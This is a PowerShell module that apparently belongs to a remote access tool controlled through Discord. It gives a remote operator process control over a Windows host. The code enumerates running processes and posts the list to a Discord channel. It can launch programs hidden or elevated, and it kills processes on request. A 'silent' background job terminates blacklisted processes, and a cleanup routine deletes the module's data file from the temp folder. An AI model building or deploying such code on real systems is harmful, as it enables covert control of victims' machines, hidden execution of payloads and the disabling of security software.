if (-not $global:ProcessBlacklist) { 
    $global:ProcessBlacklist = @() 
} elseif ($global:ProcessBlacklist -isnot [array]) {
    $global:ProcessBlacklist = @($global:ProcessBlacklist)
}

if (-not $global:ProcessMonitoringEnabled) { $global:ProcessMonitoringEnabled = $false }
if (-not $global:ProcessMonitorJob) { $global:ProcessMonitorJob = $null }

$global:process_management_channel_name = "process-management"
Get_OrCreateChannel -channelName $global:process_management_channel_name

#==================================== PERSISTENCE FUNCTIONS ====================================

function MSave_ProcessLists {
    $dataPath = "$env:TEMP\ProcessManagement_Data.json"
    $data = @{
        Blacklist = $global:ProcessBlacklist
        LastSaved = Get-Date
    }
    $data | ConvertTo-Json | Out-File -FilePath $dataPath -Encoding UTF8
    sendEmbedWithImage -Title "Process Management - BLACKLIST" -Description ":floppy_disk: **Process blacklist saved**" -ChannelTarget $global:process_management_channel_name
}

function MLoad_ProcessLists {
    $dataPath = "$env:TEMP\ProcessManagement_Data.json"
    if (Test-Path $dataPath) {
        $data = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
        $global:ProcessBlacklist = $data.Blacklist
        sendEmbedWithImage -Title "Process Management - BLACKLIST" -Description ":open_file_folder: **Process blacklist loaded**`n`n**Blacklist items:** $($global:ProcessBlacklist.Count)" -ChannelTarget $global:process_management_channel_name
    } else {
        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No saved data found**" -ChannelTarget $global:process_management_channel_name
    }
}

# Auto-load on module initialization
$dataPath = "$env:TEMP\ProcessManagement_Data.json"
if (Test-Path $dataPath) {
    $data = Get-Content -Path $dataPath -Raw | ConvertFrom-Json
    if ($data.Blacklist) { $global:ProcessBlacklist = $data.Blacklist }
}

#==================================== PROCESS LISTING ====================================

function MGet_ProcessList {
    param(
        [string]$filter = "",
        [string]$sortBy = "CPU"
    )
    
    $processes = Get-Process
    
    if ($filter) {
        $processes = $processes | Where-Object { $_.ProcessName -like "*$filter*" }
    }
    
    switch ($sortBy.ToLower()) {
        "cpu" { $processes = $processes | Sort-Object CPU -Descending }
        "memory" { $processes = $processes | Sort-Object WorkingSet -Descending }
        "name" { $processes = $processes | Sort-Object ProcessName }
        default { $processes = $processes | Sort-Object CPU -Descending }
    }
    
    $totalCount = $processes.Count
    
    # Create the process list output
    $output = ":gear: **Complete Process List** ($totalCount processes)`n"
    $output += "``````"
    $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f "Name", "PID", "Memory(MB)", "CPU", "Status"
    $output += "-" * 75 + "`n"
    
    $processes | ForEach-Object {
        $memoryMB = [math]::Round($_.WorkingSet / 1MB, 2)
        $cpuTime = if ($_.CPU) { [math]::Round($_.CPU, 2) } else { 0 }
        $status = if ($_.Responding) { "OK" } else { "Hung" }
        
        $output += "{0,-25} {1,-8} {2,-12} {3,-10} {4,-15}`n" -f $_.ProcessName, $_.Id, $memoryMB, $cpuTime, $status
    }
    $output += "``````"
    
    sendMsg -Message $output -ChannelTarget $global:process_management_channel_name
}

#==================================== PROCESS EXECUTION ====================================

function MStart_Process {
    param(
        [string]$executablePath,
        [string]$arguments = "",
        [switch]$hidden,
        [switch]$elevated
    )
    
    if (-not $executablePath) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify executable path`n**Usage:** ``STARTPROCESS -executablePath 'C:\\Windows\\System32\\notepad.exe'``" -Color "13369344" -ChannelTarget $global:ProcessChannelName
        return
    }
    
    if (-not (Test-Path $executablePath)) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** $executablePath" -Color "13369344" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    # Check if process is in blacklist
    $fileName = [System.IO.Path]::GetFileNameWithoutExtension($executablePath)
    if ($global:ProcessBlacklist -contains $fileName) {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":no_entry: **Cannot start blacklisted process:** $fileName" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $executablePath
    
    if ($arguments) {
        $startInfo.Arguments = $arguments
    }
    
    if ($hidden) {
        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $startInfo.CreateNoWindow = $true
    }
    
    if ($elevated) {
        $startInfo.Verb = "runas"
    }
    
    $process = [System.Diagnostics.Process]::Start($startInfo)
    
    if ($process) {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":rocket: **Started process:** $fileName (PID: $($process.Id))" -ChannelTarget $global:process_management_channel_name
    } else {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to start process:** $fileName" -Color "13369344" -ChannelTarget $global:process_management_channel_name
    }
}

#==================================== BLACKLIST MANAGEMENT ====================================
# Add Before process monitoring, as it wont update live ( add -> stop -> start again)
function MAdd_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``ADDBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    # Ensure ProcessBlacklist is properly initialized as an array
    if (-not $global:ProcessBlacklist) {
        $global:ProcessBlacklist = @()
    } elseif ($global:ProcessBlacklist -isnot [array]) {
        # Convert to array if it's not already one
        $global:ProcessBlacklist = @($global:ProcessBlacklist)
    }
    
    if ($global:ProcessBlacklist -notcontains $processName) {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":hourglass_flowing_sand: **Adding to blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
        
        # Use array concatenation instead of += to avoid op_Addition issues
        $global:ProcessBlacklist = $global:ProcessBlacklist + @($processName)
        
        MSave_ProcessLists
        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":no_entry: **Added to blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
    } else {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT" -Description ":information_source: **Already in blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
    }
}
# Remove Before process monitoring, as it wont update live ( remove -> stop -> start again)
function MRemove_ProcessBlacklist {
    param([string]$processName)
    
    if (-not $processName) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify process name`n**Usage:** ``REMOVEBLACKLIST -processName example``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    if ($global:ProcessBlacklist -contains $processName) {
        $global:ProcessBlacklist = $global:ProcessBlacklist | Where-Object { $_ -ne $processName }
        MSave_ProcessLists
        sendEmbedWithImage -Title "Process Management" -Description ":no_entry: **Removed from blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
    } else {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Not in blacklist:** $processName" -ChannelTarget $global:process_management_channel_name
    }
}
# works
function MShow_ProcessBlacklist {
    if ($global:ProcessBlacklist.Count -eq 0) {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":no_entry: **Process Blacklist:** Empty" -ChannelTarget $global:process_management_channel_name
    } else {
        $message = ":no_entry: **Process Blacklist:** ($($global:ProcessBlacklist.Count) items)`n"
        $global:ProcessBlacklist | ForEach-Object { $message += "Process: $_`n" }
        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description $message -ChannelTarget $global:process_management_channel_name
    }
}

#==================================== PROCESS MONITORING ====================================
# works
function MStart_ProcessMonitoring {
    param([int]$intervalSeconds = 5)
    
    if ($global:ProcessMonitoringEnabled) {
        sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Process monitoring is already running**" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    if ($global:ProcessBlacklist.Count -eq 0) {
        sendEmbedWithImage -Title "WARNING" -Description ":warning: **No processes in blacklist.** Add some first with ``ADDBLACKLIST``" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $global:ProcessMonitoringEnabled = $true

    sendEmbedWithImage -Title "Process Management" -Description ":hourglass_flowing_sand: **Starting process monitoring...**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:process_management_channel_name
    sendEmbedWithImage -Title "Process Management" -Description ":information_source: **Monitoring blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:process_management_channel_name

    $global:ProcessMonitorJob = Start-Job -ScriptBlock {
        param($token, $SessionID, $intervalSeconds, $blacklist, $ProcessChannelName, $ChannelRegistry)
        
        # Set up Discord communication variables
        $global:token = $token
        $global:SessionID = $SessionID
        $global:ChannelRegistry = $ChannelRegistry
        
        # Import ALL necessary functions from the parent session
        ${function:sendMsg} = ${using:function:sendMsg}
        ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
        ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
        ${function:Send_AsFile} = ${using:function:Send_AsFile}
        ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
        ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
        ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
        ${function:sendEmbedWithImage} = ${using:function:sendEmbedWithImage}
        ${function:Get_OrCreateChannel} = ${using:function:Get_OrCreateChannel}
        
        $knownProcesses = @{}
        
        while ($true) {
            $currentProcesses = Get-Process
            
            foreach ($proc in $currentProcesses) {
                $procKey = "$($proc.ProcessName)_$($proc.Id)"
                
                # New process detected
                if (-not $knownProcesses.ContainsKey($procKey)) {
                    $knownProcesses[$procKey] = $proc
                    
                    # Check if blacklisted (using -like for pattern matching)
                    $isBlacklisted = $false
                    foreach ($blacklistedProcess in $blacklist) {
                        if ($proc.ProcessName -like $blacklistedProcess) {
                            $isBlacklisted = $true
                            break
                        }
                    }
                    
                    # ONLY send messages for blacklisted processes
                    if ($isBlacklisted) {
                        try {
                            $proc.Kill()
                            sendEmbedWithImage -Title "Process Management" -Description ":skull_crossbones: **BLACKLISTED PROCESS TERMINATED:** $($proc.ProcessName) (PID: $($proc.Id))" -ChannelTarget $ProcessChannelName
                        } catch {
                            sendEmbedWithImage -Title "WARNING" -Description ":warning: **Failed to terminate blacklisted process:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)" -ChannelTarget $ProcessChannelName
                        }
                    }
                }
            }
            
            # Clean up terminated processes from tracking
            $currentPids = $currentProcesses | ForEach-Object { "$($_.ProcessName)_$($_.Id)" }
            $deadProcesses = $knownProcesses.Keys | Where-Object { $_ -notin $currentPids }
            foreach ($deadProc in $deadProcesses) {
                $knownProcesses.Remove($deadProc)
            }
            
            Start-Sleep -Seconds $intervalSeconds
        }
        
    } -ArgumentList $global:token, $global:SessionID, $intervalSeconds, $global:ProcessBlacklist, $global:process_management_channel_name, $global:ChannelRegistry
    
    # Wait for job to initialize
    Start-Sleep -Seconds 1
    
    sendEmbedWithImage -Title "Process Management" -Description ":eye: **Process monitoring started**`n`n**Interval:** $intervalSeconds seconds`n**Mode:** Silent (only blacklisted processes will be terminated)" -ChannelTarget $global:process_management_channel_name
}

# works
function MStop_ProcessMonitoring {
    if (-not $global:ProcessMonitoringEnabled) {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":information_source: **Process monitoring is not running**" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $global:ProcessMonitoringEnabled = $false
    
    if ($global:ProcessMonitorJob) {
        Stop-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
        Remove-Job -Job $global:ProcessMonitorJob -ErrorAction SilentlyContinue
        $global:ProcessMonitorJob = $null
    }
    
    sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":stop_sign: **Process monitoring stopped**" -ChannelTarget $global:process_management_channel_name
}

function MGet_ProcessMonitoringStatus {
    if ($global:ProcessMonitoringEnabled -and $global:ProcessMonitorJob) {
        $job = $global:ProcessMonitorJob
        if ($job.State -eq "Running") {
            sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Running (Job ID: $($job.Id)) - Silent mode" -ChannelTarget $global:process_management_channel_name
            sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description ":information_source: **Blacklisted processes:** $($global:ProcessBlacklist -join ', ')" -ChannelTarget $global:process_management_channel_name
        } else {
            sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Job exists but not running (State: $($job.State))" -ChannelTarget $global:process_management_channel_name
        }
    } else {
        sendEmbedWithImage -Title "PROCESS MANAGEMENT STATUS" -Description ":eye: **Process Monitoring Status:** Stopped" -ChannelTarget $global:process_management_channel_name
    }
}

#==================================== PROCESS DETAILS ====================================
# only works for some processes
function MGet_ProcessDetails {
    param(
        [string]$processName = "",
        [int]$processId = 0
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``PROCESSDETAILS -processName notepad`` or ``PROCESSDETAILS -processId 1234``" -Color "13369344" -ChannelTarget $global:ProcessChannelName
        return
    }
    
    $process = $null
    
    if ($processId -ne 0) {
        $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
    } else {
        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if ($processes.Count -gt 1) {
            $message = ":information_source: **Multiple processes found for '$processName':**`n"
            $processes | ForEach-Object { $message += "->$($_.ProcessName) (PID: $($_.Id))`n" }
            $message += "**Use PID for specific process details**"
            sendEmbedWithImage -Title "Process Management" -Description $message -ChannelTarget $global:ProcessChannelName
            return
        } else {
            $process = $processes | Select-Object -First 1
        }
    }
    
    if (-not $process) {
        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $memoryMB = [math]::Round($process.WorkingSet / 1MB, 2)
    $cpuTime = if ($process.CPU) { [math]::Round($process.CPU, 2) } else { "N/A" }
    $startTime = if ($process.StartTime) { $process.StartTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
    
    $details = ":gear: **Process Details:**`n"
    $details += "**Name:** $($process.ProcessName)`n"
    $details += "**PID:** $($process.Id)`n"
    $details += "**Memory:** ${memoryMB} MB`n"
    $details += "**CPU Time:** $cpuTime seconds`n"
    $details += "**Start Time:** $startTime`n"
    $details += "**Responding:** $($process.Responding)`n"
    
    if ($process.MainModule) {
        $details += "**Path:** $($process.MainModule.FileName)`n"
        $details += "**Version:** $($process.MainModule.FileVersionInfo.FileVersion)`n"
    }
    
    sendEmbedWithImage -Title "PROCESS MANAGEMENT - PROCESS DETAILS" -Description $details -ChannelTarget $global:process_management_channel_name
}

function MKill_Process {
    param(
        [string]$processName = "",
        [int]$processId = 0,
        [switch]$force
    )
    
    if (-not $processName -and $processId -eq 0) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Please specify either process name or PID`n**Usage:** ``KILLPROCESS -processName notepad`` or ``KILLPROCESS -processId 1234``" -Color "13369344" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $processes = @()
    
    if ($processId -ne 0) {
        $processes = Get-Process -Id $processId -ErrorAction SilentlyContinue
    } else {
        $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
    }
    
    if (-not $processes) {
        sendEmbedWithImage -Title "WARNING" -Description ":warning: **Process not found:** $processName (PID: $processId)" -ChannelTarget $global:process_management_channel_name
        return
    }
    
    $killedProcesses = @()
    
    foreach ($proc in $processes) {
        try {
            if ($force) {
                $proc.Kill()
            } else {
                $proc.CloseMainWindow()
                Start-Sleep -Seconds 2
                if (-not $proc.HasExited) {
                    $proc.Kill()
                }
            }
            
            $killedProcesses += "$($proc.ProcessName) (PID: $($proc.Id))"
            
        } catch {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to terminate:** $($proc.ProcessName) (PID: $($proc.Id)) - $($_.Exception.Message)" -Color "13369344" -ChannelTarget $global:process_management_channel_name
        }
    }
    
    if ($killedProcesses.Count -gt 0) {
        $message = ":skull_crossbones: **Terminated processes:**`n"
        $killedProcesses | ForEach-Object { $message += "-> $_`n" }
        sendEmbedWithImage -Title "PROCESS MANAGEMENT - BLACKLIST" -Description $message -ChannelTarget $global:process_management_channel_name
    }
}

function MProcMon_Cleanup {
    # STOP MONITORING
    MStop_ProcessMonitoring
    # DELETE THE .JSON
    if (Test-Path "$env:TEMP\ProcessManagement_Data.json") {
        Remove-Item "$env:TEMP\ProcessManagement_Data.json" -Force
    }
    sendEmbedWithImage -Title "PROCESS MANAGEMENT - CLEANUP" -Description ":wastebasket: **Cleaned up process management data and stopped monitoring**" -ChannelTarget $global:process_management_channel_name
}

